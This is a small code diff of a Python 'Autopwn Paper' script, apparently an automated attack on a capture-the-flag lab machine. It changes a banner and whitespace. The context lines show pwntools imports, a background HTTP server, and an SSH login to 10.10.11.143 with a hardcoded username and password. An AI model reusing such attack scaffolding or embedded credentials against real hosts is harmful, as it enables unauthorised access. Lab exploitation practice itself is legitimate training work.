@@ -2,7 +2,7 @@ import os
 
 try:
     from pwn import *
-    print("\n[\033[1;32m+\033[1;37m] Autopwn Paper ~ Ninhpn\n")
+    print("\n[\033[1;32m+\033[1;37m] Autopwn Paper ~ Ninhpn1337\n")
 except:
     print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
     exit(1)
@@ -12,10 +12,14 @@ def kill(sig, frame):
     sys.exit(1)
 
 signal.signal(signal.SIGINT, kill)
-
-def server():
-    os.system("python3 -m http.server 8000")
-
+
+
+def server():
+
+    os.system("python3 -m http.server 8000")
+
+
+
 threading.Thread(target=server, args=()).start()
 
 request = ssh(host='10.10.11.143', user='dwight', password='Queenofblad3s!23')
